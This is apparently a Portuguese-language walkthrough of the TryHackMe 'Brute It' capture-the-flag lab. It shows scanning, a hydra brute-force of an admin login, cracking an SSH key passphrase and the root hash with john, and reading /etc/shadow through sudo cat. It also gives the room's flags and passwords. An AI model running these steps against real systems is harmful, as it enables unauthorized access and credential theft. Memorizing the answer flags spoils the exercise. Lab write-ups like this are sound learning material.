# Brute It

## 1 task
apenas introdução sem necessidade de respostas
> sem respostas

## 2 task

### 2.1
o primeiro ele pede para ver quantas portas estão abertas na maquina:
> nmap -A 10.66.128.173
> resposta: 2

### 2.2
a segunda pergunta é sobre a versão de ssh rodando  
como fizemos o comando com -A já temos a informação  
<img width="614" height="449" alt="image" src="https://github.com/user-attachments/assets/a2d82e53-d6df-4b1e-8514-b1ef742d8cae" />
> resposta: OpenSSH 7.6p1  

### 2.3
agora pergunta a versao do apache, 
temos tabem a versao:  
> resposta: 2.4.29

### 2.4
pede a versão do linux que também temos:
> resposta: UBUNTU

### 2.5
agora pede por um diretorio escondido no servidor web
usando o comando de: `gobuster dir -u http://10.66.128.173 -w /usr/share/wordlists/dirb/common.txt `
<img width="651" height="416" alt="image" src="https://github.com/user-attachments/assets/92262570-579f-4a8d-804d-32533bbfa904" />

ele retorna o diretorio /dir:
então colocamos a senha:
> admin

## 3 task (reconhecimento)

### 3.1
ele pede para saber o user e senha do painel de admin
olhando o codigo fonte do site temos uma dica lá
falando que o user é admin

então fazemos  
`└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.128.173 http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -V -f -I`  
resulta na resposta
<img width="626" height="83" alt="image" src="https://github.com/user-attachments/assets/3c502fdd-7fe9-4615-a950-52f52383e2da" />

entao colocamos a respota:
> admin:xavier

### 3.2
agora ele pede para quebrar o RSA
clicamos no link e nos direciona para um painel com um rsa
salvamos tudo num arquivo **chave.txt** usando `nano chave.txt`  
transformamos o arquivo para o formato do john usando:
`python3 /usr/share/john/ssh2john.py chave.txt > hash_para_quebrar.txt`  
então agora sim usamos o john:
`john --wordlist=/usr/share/wordlists/rockyou.txt hash_para_quebrar.txt`  
<img width="638" height="391" alt="image" src="https://github.com/user-attachments/assets/7f444ecc-a012-46a1-92d9-2ea1614847b5" />

e com isso temos a senha:
> rockinroll

### 3.3
agora precisamos logar no ssh
sabemos que a senha é **rockinroll**  
mas precisamos saber o usuário
<img width="1275" height="315" alt="image" src="https://github.com/user-attachments/assets/f9933343-e530-436b-a538-1dab8c16ca71" />
temos o usuário john aqui

então faremos para logar no ssh dessa forma:  
1. mudar as permissões da chave que copiamos
`chmod 600 chave.txt`
mudando isso agora faremos
`ssh -i chave.txt john@10.66.128.173`  
colocamos a senha: **rockinroll**

e agora acessamos a maquina ssh.
então fazemos `ls` para ver oque temos
e depois disso vemos que temos o arquivo `user.txt`
fazemos: `cat user.txt`
<img width="637" height="70" alt="image" src="https://github.com/user-attachments/assets/7e158047-94ed-4022-b553-6985ec32646d" />

obtemos a senha:
> resposta: THM{a_password_is_not_a_barrier}

### 3.4
ele pede a flag que estava no site
> resposta: THM{brut3_f0rce_is_e4sy}

## 4 task

### 4.1
precisamos agora escalar privilegio  
faremos primeiro o comando para ver oque podemos rodar na maquina com permissões elevadas  
`sudo -l`  
<img width="625" height="129" alt="image" src="https://github.com/user-attachments/assets/2488a773-f38b-4228-97b9-9046bc9b62c9" />

então temos
acesso ao cat em forma de root
*podemos pensar que isso não serve de nada*
mas pelo contrário, conseguiremos ver QUALQUER arquivo  
então fazemos o comando para ver os hashs de senha do sistema:
`sudo /bi/cat /etc/shadow`
temos os hashs, mas só um importa, o do **root**
`root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`
copiamos isso e colamos num arquivo .txt 
`nano root.txt`  
e quebramos o hash sha-512 com o comando:
`john --wordlist=/usr/share/wordlists/rockyou.txt root.txt`  
e com isso obtemos a chave:
> resposta: football

### 4.1
e agora vamos entra no root e ver o .txt
para isso usaremos o comando:
`su root`
colocamos a senha: **football**  
e depois disso fazemos: `sudo -i`
isso muda o usuário.
depois que muda o usuário fazemos: `ls`  
vemos o arquivo de `root.txt`
<img width="624" height="81" alt="image" src="https://github.com/user-attachments/assets/2dbe7c0a-d5b5-4cfa-9d99-3d90a8cbf7c7" />

e temos a resposta:
> resposta: THM{pr1v1l3g3_3sc4l4t10n}

e com isso finalizamos o CTF
